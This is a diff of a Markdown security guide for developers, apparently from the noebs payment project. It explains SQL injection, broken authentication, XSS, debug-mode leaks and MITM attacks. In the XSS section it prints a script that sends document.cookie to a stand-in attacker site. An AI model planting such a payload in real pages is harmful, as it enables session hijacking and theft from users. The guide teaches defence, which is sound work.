@@ -22,11 +22,13 @@ form = request.form()
 username = form["username"]   # there's an form field called username
 sql.exec(username)    # This is a _sql injection_
 ```
+
 It is almost always bad to execute raw sql queries. In fact, unless you DB is read-only, there's no need at ALL to allow raw sql queries execution.
 
 The solution is: Don't allow raw sql execution.
 
 # Broken Authentication
+
 This can be broken into two categories:
 - you're either building an insecure authentication system that exposes your users' data,
 - or, your login system allows repeated logins attempts (brute-forcing)
@@ -40,16 +42,20 @@ For this, we have two solutions:
 > HSTS causes compliant browsers to strictly enforce web security practices. Specifically, it automatically turns all HTTP links into HTTPS links within an application, and it upgrades all SSL errors from warnings or bypassable errors into non-bypassable errors.
 
 # XSS (Cross-site scription)
+
 An attacker can send a malicious JS code (in the client code). It can be as bad as copying the user's cookies and gain control access to their session.
 
 Suppose that you have an HTML form that allows your users to write some notes about their transactions, here is a sample code:
+
 ```html
 <form>
 <input type="text">
 <label>Type your note here</label>
 </form>
 ```
+
 The user's form will be submitted __and__ rendered in a new page! Now this is very dangerous and it what leads to XSS security breaches. Let's see this in action. The next HTML page which will render the form result is like this:
+
 ```html
 <!-- skipping through HTML head -->
 <div>
@@ -57,9 +63,11 @@ The user's form will be submitted __and__ rendered in a new page! Now this is ve
 </div>
 
 ```
+
 We expect our users to input stuff like time, text data BUT NOT JS CODE! What happens, if the users submitted `<script>alert("You have been spawned!")</script>`. This will launch a JS code from suspecious user's input. Now, this code can be even worse and accesses the user's cookies.
 
 ## How the attacker can log your cookies
+
 It is quite simply actually. You can access your website cookie by accessing the cookie property of document class:
 - use your browser inspector and go to console
 - print document.cookie
@@ -70,11 +78,13 @@ Now if the attacker wants to get that cookie, they will need to send it somewher
 - the attacker submits an unsafe js code that redirects the users to a new website (where they will log the cookie)
 - now, the attacker does have access to your session and can do whatever they want while they are there (they can see your payment card info for instance, they can even submit a transaction assuming that your PIN is 0000 or your birthday)
 The JS code to get your cookie is just this:
-`
+
+```javascript
 <script>
 document.location="http://mybadwebsite.com/?cookie_handler=" + document.cookie
 </script>
-`
+```
+
 __This can be even smarter by redirecting the user back to their original website!__
 
 And now, when the user submits that un-sanitized inputs, it will:
@@ -98,17 +108,21 @@ I have seen this in the wild very recently in a payment system. We as developers
 Many of web frameworks (Django for instance) have DEBUG mode where instead of returing 500 INTERNAL SERVER ERROR, they also include the stack trace (when DEBUG=True) in Django `settings.py`. While this is very important while developing, it is very catastrophic in real life!
 
 # Sensitive data exposure and MITM
+
 We work in payment systems and it is very important to secure our user's data (their payment card info). These systems must adhere to even strictier rules than what OWASP offers as they have VERY sensitive data. PCI-DSS compliancy should be a #1 target for such systems and they shoud monitor and audit their systems and upgrade them regularly. _Security should be a profound part of their system design!_
 
 > While getting EBS certificate is quite enough to have a secure system, we know that vendors often tend to modify their EBS-certified systems. This is a huge issue and it renders the whole EBS certification part useless.
 
 ## What we do in noebs to secure your data
+
 - KISS (keeping it simple, stupid!). We are keeping it simple: we are only storing your PAN and expiration date, we don't store anything else!
 - We had long discussions about storing PAN and expiration date, but we plan to change the way we store them VERY SOON!
 - We have a Zero-log policy, so even if an attacker has breached our system, they will find no useful data!
 
 ## MITM Attacks
+
 Man in the middle attacks are a very special and interesting class of attacks.
+
 - You are using https for securing your system
 - You have successfully solved CSRF, XSS and SQL Injections (hooray!)
 - and now everything is fine, right?
